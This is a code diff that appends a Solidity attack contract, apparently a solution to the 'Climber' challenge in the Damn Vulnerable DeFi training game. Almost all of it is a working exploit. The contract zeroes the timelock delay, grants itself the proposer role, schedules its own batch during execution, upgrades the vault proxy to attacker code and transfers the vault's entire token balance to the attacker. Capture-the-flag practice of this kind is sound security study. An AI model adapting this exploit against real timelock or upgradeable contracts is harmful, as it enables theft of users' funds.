@@ -111,3 +111,79 @@ contract ClimberTimelock is ClimberTimelockBase {
         delay = newDelay;
     }
 }
+
+import "./ClimberVault.sol";
+import "../DamnValuableToken.sol";
+import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
+
+contract ClimberAttacker is UUPSUpgradeable {
+    ClimberTimelock timelock;
+    ClimberVault vault;
+    DamnValuableToken private immutable token;
+    address private immutable attacker;
+
+
+
+    
+    address[] targets = new address[](5);
+    uint256[] values = new uint256[](5);
+    bytes[] dataElements = new bytes[](5);
+
+
+
+    constructor(address _vault, address _timelock, address _token) {
+        vault = ClimberVault(_vault);
+        timelock = ClimberTimelock(payable(_timelock));
+        token = DamnValuableToken(_token);
+        attacker = msg.sender;
+    }
+
+    function attack() external {
+
+
+        // Step 1: update delay
+        targets[0] = address(timelock);
+        values[0] = 0;
+        dataElements[0] = abi.encodeWithSelector(ClimberTimelock.updateDelay.selector, uint64(0));
+
+
+        // Step 2: grant proposal role to our attacker contract (as ClimberTimelock is admin and can grant PROPOSER_ROLE)
+        // PROPOSER_ROLE = 0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1
+        targets[1] = address(timelock);
+        values[1] = 0;
+        dataElements[1] = abi.encodeWithSelector(AccessControl.grantRole.selector, 0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1, address(this));
+        
+        // Step 3 : schedule the operation, to make the future check OK
+        targets[2] = address(this);
+        values[2] = 0;
+        dataElements[2] = abi.encodeWithSelector(this.schedule.selector);
+
+
+        // Step 4 : upgrade proxy to point to our contract
+        targets[3] = address(vault);
+        values[3] = 0;
+        dataElements[3] = abi.encodeWithSelector(UUPSUpgradeable.upgradeTo.selector, address(this));
+
+
+        // Step 5 : call the transferAllFunds function from the proxy
+        uint256 balance = token.balanceOf(address(vault));
+        targets[4] = address(vault);
+        values[4] = 0;
+        dataElements[4] = abi.encodeWithSelector(this.transferAllFunds.selector, attacker, balance);
+
+        timelock.execute(targets, values, dataElements, "0x123456");
+    }
+
+    function schedule() external {
+        timelock.schedule(targets, values, dataElements, "0x123456");
+    }
+
+    function transferAllFunds(address _attacker, uint256 amount) external {
+        token.transfer(_attacker, amount);
+    }
+
+    function _authorizeUpgrade(address newImplementation) internal override {}
+
+}
+
+import "hardhat/console.sol";
